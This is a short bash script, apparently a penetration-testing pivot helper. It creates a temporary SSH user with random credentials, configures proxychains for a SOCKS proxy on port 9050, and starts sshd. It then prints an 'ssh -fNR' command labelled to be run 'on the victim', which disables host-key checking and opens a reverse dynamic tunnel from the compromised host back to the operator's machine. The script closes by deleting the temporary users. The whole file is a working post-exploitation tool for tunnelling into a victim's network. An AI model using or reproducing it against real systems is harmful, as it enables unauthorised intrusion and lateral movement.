#!/bin/bash
if [[ "$EUID" -ne 0 ]]; then 
	echo "Please run as root"
	exit
fi

echo "Local IP Addresses:"
ip a | grep inet
echo

read -p "Select a local IP address: " local_ip
if [[ -z $local_ip ]]; then
	echo "You must enter a local IP"
	exit
fi

comment="Temporary user for port fwding"
# Generate random credentials
local_user=$(\
	head -c 10 /dev/urandom | \
	base64 -w 0 | \
	tr --delete --complement '[:alnum:]')
local_password=$(\
	head -c 20 /dev/urandom | \
	base64 -w 0 | \
	tr --delete --complement '[:alnum:]')

# Configure proxychains if necessary
grep 'socks4.*9050' /etc/proxychains.conf 1>/dev/null 2>&1 || \
	echo 'socks4  127.0.0.1 9050' >> /etc/proxychains.conf

# Add temp user
useradd \
	--comment "Temporary user for port fwding" \
	--no-create-home \
	--home-dir /tmp \
	--shell /bin/false \
	$local_user
echo ${local_user}:${local_password} | chpasswd

systemctl start ssh

echo "Run the following command on the victim:"
echo 
echo "ssh -fNR 9050 ${local_user}@${local_ip} -oStrictHostKeyChecking=no"
echo
echo "Password: ${local_password}"

echo
read -p "=== Press Enter to End Dynamic Port Forward ===
"

# Cleanup
systemctl stop ssh
temp_users=$(grep "$comment" /etc/passwd | awk -F ':' '{ print $1 }')
for user in $temp_users; do
	killall -u $user
	userdel $user
	echo "Deleted user $user"
done
